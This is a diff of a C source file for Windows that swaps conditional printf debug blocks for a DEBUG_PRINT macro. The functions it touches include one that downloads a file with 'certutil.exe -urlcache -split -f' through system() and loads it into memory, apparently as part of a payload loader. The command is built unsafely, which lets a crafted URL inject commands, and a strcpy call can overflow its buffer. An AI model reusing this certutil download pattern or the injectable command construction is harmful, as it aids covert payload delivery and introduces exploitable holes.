@@ -3,6 +3,7 @@
 #include <stdio.h>
 #include <windows.h>
 #include <string.h>
+#include "../../debug_print/debug_print.h"
 
 
 // Searches for the last occurence of the '/' character and returns the string remaining after that last occurence
@@ -37,9 +38,7 @@ int get_filesize(char *fvalue)
 	for (size = 0; (rc1 = getc(fp1)) != EOF; size++) {}
 	fclose(fp1);
 	
-	#ifdef PRINT_DEBUG
-		printf("get_filesize, filesize %s: %d\n", fvalue, size);
-	#endif
+	DEBUG_PRINT(("get_filesize, filesize %s: %d\n", fvalue, size));
 
 	return size;
 }
@@ -49,10 +48,8 @@ int get_filesize(char *fvalue)
 // Automatically allocates memory for this
 unsigned char *load_textfile(char *fvalue, int size)
 {
-	#ifdef PRINT_DEBUG
-		printf("load_textfile called: fvalue: %s, size: %d\n", fvalue, size);
-	#endif
-
+	DEBUG_PRINT(("load_textfile called: fvalue: %s, size: %d\n", fvalue, size));
+	
 	//allocate buffer, open file, read file to the buffer, close the file
 	unsigned char *buffer = (unsigned char*) malloc(size+1);
 	int i, rc;
@@ -72,10 +69,8 @@ unsigned char *load_textfile(char *fvalue, int size)
 		rc = getc(fp);
 		buffer[i] = rc;
 	}
-
-	#ifdef PRINT_DEBUG
-		printf("%s\n",buffer);
-	#endif
+	
+	DEBUG_PRINT(("%s\n",buffer));	
 
 	fclose(fp);	
 	return buffer;
@@ -87,27 +82,22 @@ unsigned char *load_textfile(char *fvalue, int size)
 //
 // data_size receives the size of the data in bytes.
 unsigned char* download_certutil(char *arg1, int *data_size) {
-	#ifdef PRINT_DEBUG
-		printf("download data to file via certutil\n");
-	#endif
+	DEBUG_PRINT(("download data to file via certutil\n"));	
 	
 	char download[500];  //how not to do it...
 	sprintf(download,"certutil.exe -urlcache -split -f %s", arg1);
-	#ifdef PRINT_DEBUG
-		printf("url: %s\n", download);
-	#endif
+
+	DEBUG_PRINT(("url: %s\n", download));
+	
 	system(download);
-	#ifdef PRINT_DEBUG
-		printf("download done\n");
-	#endif	
+	
+    DEBUG_PRINT(("download done\n"));
 	
 	char sh_filename[128];
 	strcpy(sh_filename, get_filename_from_url(arg1));
 	
-	#ifdef PRINT_DEBUG
-		printf("sh_filename = %s\n", sh_filename);
-	#endif
-	
+	DEBUG_PRINT(("sh_filename = %s\n", sh_filename));
+		
 	*data_size = get_filesize(sh_filename);	
 	return load_textfile(sh_filename, *data_size);	
 }
